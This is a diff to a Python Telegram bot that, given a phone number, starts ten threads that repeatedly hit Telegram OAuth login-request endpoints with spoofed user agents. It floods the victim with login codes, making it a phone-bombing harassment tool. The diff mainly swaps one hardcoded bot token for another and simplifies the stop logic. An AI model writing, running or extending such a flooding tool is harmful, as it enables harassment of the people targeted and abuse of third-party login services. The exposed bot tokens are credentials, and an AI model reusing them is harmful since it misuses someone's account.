@@ -2,9 +2,8 @@ import telebot
 import requests
 from fake_useragent import UserAgent
 import threading
-import time
 
-bot = telebot.TeleBot("8889368729:AAGcJyjZ9JWxRGVI00Q31KomLfwXC1Kqi3w")
+bot = telebot.TeleBot("8736392114:AAFbnaTe3ZLkjCP2Pu7bQnPm2sEMYPV6RUU")
 
 endpoints = [
     'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin',
@@ -40,10 +39,10 @@ def handle(m):
         return
 
     markup = telebot.types.InlineKeyboardMarkup()
-    markup.add(telebot.types.InlineKeyboardButton("⛔ Стоп", callback_data='stop'))
+    markup.add(telebot.types.InlineKeyboardButton("стоп", callback_data='stop'))
     bot.reply_to(m, '<tg-emoji emoji-id="6327965167636186577">лижу (номер)</tg-emoji>', parse_mode='HTML', reply_markup=markup)
 
-    active[m.chat.id] = {'stop': False, 'threads': []}
+    active[m.chat.id] = {'stop': False}
 
     def worker(chat_id, phone):
         ua = UserAgent()
@@ -59,18 +58,13 @@ def handle(m):
                     pass
 
     for _ in range(10):
-        t = threading.Thread(target=worker, args=(m.chat.id, phone), daemon=True)
-        t.start()
-        active[m.chat.id]['threads'].append(t)
+        threading.Thread(target=worker, args=(m.chat.id, phone), daemon=True).start()
 
 @bot.callback_query_handler(func=lambda call: call.data == 'stop')
 def stop_callback(call):
     chat_id = call.message.chat.id
     if chat_id in active:
         active[chat_id]['stop'] = True
-        for t in active[chat_id]['threads']:
-            t.join(timeout=0.5)
-        del active[chat_id]
         bot.answer_callback_query(call.id, 'остановлено')
         bot.edit_message_text('остановлено', chat_id, call.message.message_id)
     else:
